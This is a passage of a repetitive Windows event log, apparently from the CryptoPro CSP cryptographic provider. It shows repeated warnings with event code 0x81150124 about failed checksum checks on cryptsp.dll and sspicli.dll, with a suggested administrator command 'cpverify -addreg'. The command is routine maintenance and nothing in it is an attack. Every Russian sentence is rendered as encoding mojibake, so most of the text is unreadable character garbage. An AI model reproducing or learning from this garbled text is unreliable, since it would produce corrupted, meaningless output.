—Ç–∞—Ç—å —Ö—ç—à–∏"" –≤ –ø–∞–Ω–µ–ª–∏ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP –Ω–∞ –≤–∫–ª–∞–¥–∫–µ ""–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ"" –∏–ª–∏ –ø–µ—Ä–µ—Å—á–∏—Ç–∞–π—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—É—é —Å—É–º–º—É –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –≤ —Ä–µ–µ—Å—Ç—Ä–µ, –∑–∞
–ø—É—Å—Ç–∏–≤ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞: start cpverify -addreg -file ""C:\Windows\system32\cryptsp.dll""
         –í–æ–∑–Ω–∏–∫–ª–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ. –ö–æ–¥ —Å–æ–±—ã—Ç–∏—è (EventID): 0x81150124
            –í—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è: 04/08/2024   11:23:14
            –°—Ç—Ä–æ–∫–∞ —Å–æ–±—ã—Ç–∏—è:
            –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ–π —Å—É–º–º—ã. –§–∞–π–ª: C:\Windows\system32\cryptsp.dll. –ü—Ä–∏—á–∏–Ω–æ–π –æ—à–∏–±–∫–∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–±–Ω–æ–≤–ª–µ
–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP.  –û–±–Ω–æ–≤–∏—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–µ —Å—É–º–º—ã —Å –ø–æ–º–æ—â—å—é –∫–Ω–æ–ø–∫–∏ ""–ü–µ—Ä–µ—Å—á–∏
—Ç–∞—Ç—å —Ö—ç—à–∏"" –≤ –ø–∞–Ω–µ–ª–∏ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP –Ω–∞ –≤–∫–ª–∞–¥–∫–µ ""–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ"" –∏–ª–∏ –ø–µ—Ä–µ—Å—á–∏—Ç–∞–π—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—É—é —Å—É–º–º—É –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –≤ —Ä–µ–µ—Å—Ç—Ä–µ, –∑–∞
–ø—É—Å—Ç–∏–≤ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞: start cpverify -addreg -file ""C:\Windows\system32\cryptsp.dll""
         –í–æ–∑–Ω–∏–∫–ª–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ. –ö–æ–¥ —Å–æ–±—ã—Ç–∏—è (EventID): 0x81150124
            –í—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è: 04/08/2024   11:23:14
            –°—Ç—Ä–æ–∫–∞ —Å–æ–±—ã—Ç–∏—è:
            –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ–π —Å—É–º–º—ã. –§–∞–π–ª: C:\Windows\system32\sspicli.dll. –ü—Ä–∏—á–∏–Ω–æ–π –æ—à–∏–±–∫–∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–±–Ω–æ–≤–ª–µ
–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP.  –û–±–Ω–æ–≤–∏—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–µ —Å—É–º–º—ã —Å –ø–æ–º–æ—â—å—é –∫–Ω–æ–ø–∫–∏ ""–ü–µ—Ä–µ—Å—á–∏
—Ç–∞—Ç—å —Ö—ç—à–∏"" –≤ –ø–∞–Ω–µ–ª–∏ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP –Ω–∞ –≤–∫–ª–∞–¥–∫–µ ""–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ"" –∏–ª–∏ –ø–µ—Ä–µ—Å—á–∏—Ç–∞–π—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—É—é —Å—É–º–º—É –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –≤ —Ä–µ–µ—Å—Ç—Ä–µ, –∑–∞
–ø—É—Å—Ç–∏–≤ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞: start cpverify -addreg -file ""C:\Windows\system32\sspicli.dll""
         –í–æ–∑–Ω–∏–∫–ª–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ. –ö–æ–¥ —Å–æ–±—ã—Ç–∏—è (EventID): 0x81150124
            –í—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è: 04/08/2024   11:23:14
            –°—Ç—Ä–æ–∫–∞ —Å–æ–±—ã—Ç–∏—è:
            –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ–π —Å—É–º–º—ã. –§–∞–π–ª: C:\Windows\system32\sspicli.dll. –ü—Ä–∏—á–∏–Ω–æ–π –æ—à–∏–±–∫–∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–±–Ω–æ–≤–ª–µ
–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP.  –û–±–Ω–æ–≤–∏—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–µ —Å—É–º–º—ã —Å –ø–æ–º–æ—â—å—é –∫–Ω–æ–ø–∫–∏ ""–ü–µ—Ä–µ—Å—á–∏
—Ç–∞—Ç—å —Ö—ç—à–∏"" –≤ –ø–∞–Ω–µ–ª–∏ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP –Ω–∞ –≤–∫–ª–∞–¥–∫–µ ""–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ"" –∏–ª–∏ –ø–µ—Ä–µ—Å—á–∏—Ç–∞–π—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—É—é —Å—É–º–º—É –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –≤ —Ä–µ–µ—Å—Ç—Ä–µ, –∑–∞
–ø—É—Å—Ç–∏–≤ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞: start cpverify -addreg -file ""C:\Windows\system32\sspicli.dll""
         –í–æ–∑–Ω–∏–∫–ª–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ. –ö–æ–¥ —Å–æ–±—ã—Ç–∏—è (EventID): 0x81150124
            –í—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è: 04/08/2024   11:23:14
            –°—Ç—Ä–æ–∫–∞ —Å–æ–±—ã—Ç–∏—è:
            –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ–π —Å—É–º–º—ã. –§–∞–π–ª: C:\Windows\system32\sspicli.dll. –ü—Ä–∏—á–∏–Ω–æ–π –æ—à–∏–±–∫–∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–±–Ω–æ–≤–ª–µ
–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP.  –û–±–Ω–æ–≤–∏—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–µ —Å—É–º–º—ã —Å –ø–æ–º–æ—â—å—é –∫–Ω–æ–ø–∫–∏ ""–ü–µ—Ä–µ—Å—á–∏
—Ç–∞—Ç—å —Ö—ç—à–∏"" –≤ –ø–∞–Ω–µ–ª–∏ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP –Ω–∞ –≤–∫–ª–∞–¥–∫–µ ""–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ"" –∏–ª–∏ –ø–µ—Ä–µ—Å—á–∏—Ç–∞–π—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—É—é —Å—É–º–º—É –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –≤ —Ä–µ–µ—Å—Ç—Ä–µ, –∑–∞
–ø—É—Å—Ç–∏–≤ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞: start cpverify -addreg -file ""C:\Windows\system32\sspicli.dll""
         –í–æ–∑–Ω–∏–∫–ª–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ. –ö–æ–¥ —Å–æ–±—ã—Ç–∏—è (EventID): 0x81150124
            –í—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è: 04/08/2024   11:23:14
            –°—Ç—Ä–æ–∫–∞ —Å–æ–±—ã—Ç–∏—è:
            –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ–π —Å—É–º–º—ã. –§–∞–π–ª: C:\Windows\system32\cryptsp.dll. –ü—Ä–∏—á–∏–Ω–æ–π –æ—à–∏–±–∫–∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–±–Ω–æ–≤–ª–µ
–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP.  –û–±–Ω–æ–≤–∏—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–µ —Å—É–º–º—ã —Å –ø–æ–º–æ—â—å—é –∫–Ω–æ–ø–∫–∏ ""–ü–µ—Ä–µ—Å—á–∏
—Ç–∞—Ç—å —Ö—ç—à–∏"" –≤ –ø–∞–Ω–µ–ª–∏ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP –Ω–∞ –≤–∫–ª–∞–¥–∫–µ ""–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ"" –∏–ª–∏ –ø–µ—Ä–µ—Å—á–∏—Ç–∞–π—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—É—é —Å—É–º–º—É –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –≤ —Ä–µ–µ—Å—Ç—Ä–µ, –∑–∞
–ø—É—Å—Ç–∏–≤ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞: start cpverify -addreg -file ""C:\Windows\system32\cryptsp.dll""
         –í–æ–∑–Ω–∏–∫–ª–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ. –ö–æ–¥ —Å–æ–±—ã—Ç–∏—è (EventID): 0x81150124
            –í—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è: 04/08/2024   11:23:15
            –°—Ç—Ä–æ–∫–∞ —Å–æ–±—ã—Ç–∏—è:
            –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ–π —Å—É–º–º—ã. –§–∞–π–ª: C:\Windows\system32\cryptsp.dll. –ü—Ä–∏—á–∏–Ω–æ–π –æ—à–∏–±–∫–∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–±–Ω–æ–≤–ª–µ
–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP.  –û–±–Ω–æ–≤–∏—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–µ —Å—É–º–º—ã —Å –ø–æ–º–æ—â—å—é –∫–Ω–æ–ø–∫–∏ ""–ü–µ—Ä–µ—Å—á–∏
—Ç–∞—Ç—å —Ö—ç—à–∏"" –≤ –ø–∞–Ω–µ–ª–∏ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP –Ω–∞ –≤–∫–ª–∞–¥–∫–µ ""–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ"" –∏–ª–∏ –ø–µ—Ä–µ—Å—á–∏—Ç–∞–π—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—É—é —Å—É–º–º—É –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –≤ —Ä–µ–µ—Å—Ç—Ä–µ, –∑–∞
–ø—É—Å—Ç–∏–≤ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞: start cpverify -addreg -file ""C:\Windows\system32\cryptsp.dll""
         –í–æ–∑–Ω–∏–∫–ª–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ. –ö–æ–¥ —Å–æ–±—ã—Ç–∏—è (EventID): 0x81150124
            –í—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è: 04/08/2024   11:23:15
            –°—Ç—Ä–æ–∫–∞ —Å–æ–±—ã—Ç–∏—è:
            –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ–π —Å—É–º–º—ã. –§–∞–π–ª: C:\Windows\system32\sspicli.dll. –ü—Ä–∏—á–∏–Ω–æ–π –æ—à–∏–±–∫–∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–±–Ω–æ–≤–ª–µ
–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP.  –û–±–Ω–æ–≤–∏—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–µ —Å—É–º–º—ã —Å –ø–æ–º–æ—â—å—é –∫–Ω–æ–ø–∫–∏ ""–ü–µ—Ä–µ—Å—á–∏
—Ç–∞—Ç—å —Ö—ç—à–∏"" –≤ –ø–∞–Ω–µ–ª–∏ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP –Ω–∞ –≤–∫–ª–∞–¥–∫–µ ""–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ"" –∏–ª–∏ –ø–µ—Ä–µ—Å—á–∏—Ç–∞–π—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—É—é —Å—É–º–º—É –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –≤ —Ä–µ–µ—Å—Ç—Ä–µ, –∑–∞
–ø—É—Å—Ç–∏–≤ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞: start cpverify -addreg -file ""C:\Windows\system32\sspicli.dll""
         –í–æ–∑–Ω–∏–∫–ª–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ. –ö–æ–¥ —Å–æ–±—ã—Ç–∏—è (EventID): 0x81150124
            –í—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è: 04/08/2024   11:23:19
            –°—Ç—Ä–æ–∫–∞ —Å–æ–±—ã—Ç–∏—è:
            –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ–π —Å—É–º–º—ã. –§–∞–π–ª: C:\Windows\system32\cryptsp.dll. –ü—Ä–∏—á–∏–Ω–æ–π –æ—à–∏–±–∫–∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–±–Ω–æ–≤–ª–µ
–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP.  –û–±–Ω–æ–≤–∏—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–µ —Å—É–º–º—ã —Å –ø–æ–º–æ—â—å—é –∫–Ω–æ–ø–∫–∏ ""–ü–µ—Ä–µ—Å—á–∏
—Ç–∞—Ç—å —Ö—ç—à–∏"" –≤ –ø–∞–Ω–µ–ª–∏ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP –Ω–∞ –≤–∫–ª–∞–¥–∫–µ ""–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ"" –∏–ª–∏ –ø–µ—Ä–µ—Å—á–∏—Ç–∞–π—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—É—é —Å—É–º–º—É –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –≤ —Ä–µ–µ—Å—Ç—Ä–µ, –∑–∞
–ø—É—Å—Ç–∏–≤ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞: start cpverify -addreg -file ""C:\Windows\system32\cryptsp.dll""
         –í–æ–∑–Ω–∏–∫–ª–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ. –ö–æ–¥ —Å–æ–±—ã—Ç–∏—è (EventID): 0x81150124
            –í—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è: 04/08/2024   11:23:19
            –°—Ç—Ä–æ–∫–∞ —Å–æ–±—ã—Ç–∏—è:
            –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ–π —Å—É–º–º—ã. –§–∞–π–ª: C:\Windows\system32\cryptsp.dll. –ü—Ä–∏—á–∏–Ω–æ–π –æ—à–∏–±–∫–∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–±–Ω–æ–≤–ª–µ
–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP.  –û–±–Ω–æ–≤–∏—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–µ —Å—É–º–º—ã —Å –ø–æ–º–æ—â—å—é –∫–Ω–æ–ø–∫–∏ ""–ü–µ—Ä–µ—Å—á–∏
—Ç–∞—Ç—å —Ö—ç—à–∏"" –≤ –ø–∞–Ω–µ–ª–∏ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP –Ω–∞ –≤–∫–ª–∞–¥–∫–µ ""–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ"" –∏–ª–∏ –ø–µ—Ä–µ—Å—á–∏—Ç–∞–π—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—É—é —Å—É–º–º—É –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –≤ —Ä–µ–µ—Å—Ç—Ä–µ, –∑–∞
–ø—É—Å—Ç–∏–≤ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞: start cpverify -addreg -file ""C:\Windows\system32\cryptsp.dll""
         –í–æ–∑–Ω–∏–∫–ª–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ. –ö–æ–¥ —Å–æ–±—ã—Ç–∏—è (EventID): 0x81150124
            –í—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è: 04/08/2024   11:23:20
            –°—Ç—Ä–æ–∫–∞ —Å–æ–±—ã—Ç–∏—è:
            –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ–π —Å—É–º–º—ã. –§–∞–π–ª: C:\Windows\SysWOW64\cryptsp.dll. –ü—Ä–∏—á–∏–Ω–æ–π –æ—à–∏–±–∫–∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–±–Ω–æ–≤–ª–µ
–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP.  –û–±–Ω–æ–≤–∏—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–µ —Å—É–º–º—ã —Å –ø–æ–º–æ—â—å—é –∫–Ω–æ–ø–∫–∏ ""–ü–µ—Ä–µ—Å—á–∏
—Ç–∞—Ç—å —Ö—ç—à–∏"" –≤ –ø–∞–Ω–µ–ª–∏ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP –Ω–∞ –≤–∫–ª–∞–¥–∫–µ ""–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ"" –∏–ª–∏ –ø–µ—Ä–µ—Å—á–∏—Ç–∞–π—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—É—é —Å—É–º–º—É –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –≤ —Ä–µ–µ—Å—Ç—Ä–µ, –∑–∞
–ø—É—Å—Ç–∏–≤ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞: start cpverify -addreg -file ""C:\Windows\SysWOW64\cryptsp.dll""
         –í–æ–∑–Ω–∏–∫–ª–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ. –ö–æ–¥ —Å–æ–±—ã—Ç–∏—è (EventID): 0x81150124
            –í—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è: 04/08/2024   11:23:24
            –°—Ç—Ä–æ–∫–∞ —Å–æ–±—ã—Ç–∏—è:
            –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ–π —Å—É–º–º—ã. –§–∞–π–ª: C:\Windows\system32\sspicli.dll. –ü—Ä–∏—á–∏–Ω–æ–π –æ—à–∏–±–∫–∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–±–Ω–æ–≤–ª–µ
–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP.  –û–±–Ω–æ–≤–∏—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–µ —Å—É–º–º—ã —Å –ø–æ–º–æ—â—å—é –∫–Ω–æ–ø–∫–∏ ""–ü–µ—Ä–µ—Å—á–∏
—Ç–∞—Ç—å —Ö—ç—à–∏"" –≤ –ø–∞–Ω–µ–ª–∏ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP –Ω–∞ –≤–∫–ª–∞–¥–∫–µ ""–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ"" –∏–ª–∏ –ø–µ—Ä–µ—Å—á–∏—Ç–∞–π—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—É—é —Å—É–º–º—É –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –≤ —Ä–µ–µ—Å—Ç—Ä–µ, –∑–∞
–ø—É—Å—Ç–∏–≤ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞: start cpverify -addreg -file ""C:\Windows\system32\sspicli.dll""
         –í–æ–∑–Ω–∏–∫–ª–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ. –ö–æ–¥ —Å–æ–±—ã—Ç–∏—è (EventID): 0x81150124
            –í—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è: 04/08/2024   11:23:24
            –°—Ç—Ä–æ–∫–∞ —Å–æ–±—ã—Ç–∏—è:
            –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ–π —Å—É–º–º—ã. –§–∞–π–ª: C:\Windows\system32\cryptsp.dll. –ü—Ä–∏—á–∏–Ω–æ–π –æ—à–∏–±–∫–∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–±–Ω–æ–≤–ª–µ
–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP.  –û–±–Ω–æ–≤–∏—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–µ —Å—É–º–º—ã —Å –ø–æ–º–æ—â—å—é –∫–Ω–æ–ø–∫–∏ ""–ü–µ—Ä–µ—Å—á–∏
—Ç–∞—Ç—å —Ö—ç—à–∏"" –≤ –ø–∞–Ω–µ–ª–∏ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP –Ω–∞ –≤–∫–ª–∞–¥–∫–µ ""–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ"" –∏–ª–∏ –ø–µ—Ä–µ—Å—á–∏—Ç–∞–π—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—É—é —Å—É–º–º—É –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –≤ —Ä–µ–µ—Å—Ç—Ä–µ, –∑–∞
–ø—É—Å—Ç–∏–≤ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞: start cpverify -addreg -file ""C:\Windows\system32\cryptsp.dll""
         –í–æ–∑–Ω–∏–∫–ª–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ. –ö–æ–¥ —Å–æ–±—ã—Ç–∏—è (EventID): 0x81150124
            –í—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è: 04/08/2024   11:23:31
            –°—Ç—Ä–æ–∫–∞ —Å–æ–±—ã—Ç–∏—è:
            –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ–π —Å—É–º–º—ã. –§–∞–π–ª: C:\Windows\system32\cryptsp.dll. –ü—Ä–∏—á–∏–Ω–æ–π –æ—à–∏–±–∫–∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–±–Ω–æ–≤–ª–µ
